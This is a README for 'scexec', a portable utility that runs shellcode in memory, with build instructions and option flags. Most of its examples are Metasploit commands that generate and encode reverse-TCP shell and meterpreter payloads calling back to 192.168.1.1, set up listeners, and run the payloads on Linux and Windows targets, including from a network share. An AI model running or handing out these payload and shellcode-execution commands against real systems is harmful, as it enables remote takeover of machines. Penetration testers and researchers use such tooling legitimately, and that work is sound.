scexec
======

Portable utility to execute in memory a sequence of opcodes

Features
========

- Linux/Windows/Mac support
- Visual C/C++, gcc, mingw32/mingw64 support
- Raw/Alphanumeric/Base64/UUdecode support
- Commandline argument/File support

Examples
========

## Linux target

    $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
    $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
    $ ./scexec <msfencode's alphanumeric-encoded payload>

## Windows target

    msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
    msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 E
    C:\> scexec.exe <msfencode's alphanumeric-encoded payload>

## Windows target with base64

    msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | perl utils/base64encode.pl
    msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 E
    C:\> scexec.exe b <msfpayload-base64encoded-payload>

## Linux target with uudecode/uuencode

    $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | perl utils/uuencode.pl
    $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
    $ ./scexec u <msfpayload-uuencoded-payload>

## Few more quick examples

Read payload from filename msfpayloadfn:

    C:\> scexec.exe f <msfpayloadfn>

Read base64 encoded payload from filename msfpayloadfn:

    C:\> scexec.exe fb <msfpayloadfn>

Read base64 payload from share:

    C:\> \\192.168.1.1\\scexec.exe f \\192.168.1.1\\msfpayload.raw

Options explained
=================

Options can be combined:

no options - read alphanumeric shellcode from commandline

a - execute shellcode through call eax/rax

f - read shellcode from file

b - treat input shellcode as base64 encoded

u - treat input shellcode as uuencoded shellcode


Building
========

### Linux/Mac/POSIX builds

Just type:

    make

### Mingw builds:

32 bit:

    make CC=i686-w64-mingw32-gcc STRIP=i686-w64-mingw32-strip OUT=scexec32.exe

64 bit:

    make CC=x86_64-w64-mingw32-gcc STRIP=x86_64-w64-mingw32-strip OUT=scexec64.exe

### Visual Studio:

32 bit:

    nmake /f Makefile.vc

64 bit:

    nmake /f Makefile.v64

### Builds

    make CC=i386-mingw32-gcc STRIP=i386-mingw32-strip OUT=../bin/scexec-win32.exe
    make CC=gcc STRIP=strip OUT=../bin/scexec-macosx-x64-dyn.bin

Credits
=======

Vlatko Kosturjak

Based on Bernardo Damele A. G. shellcodeexecute

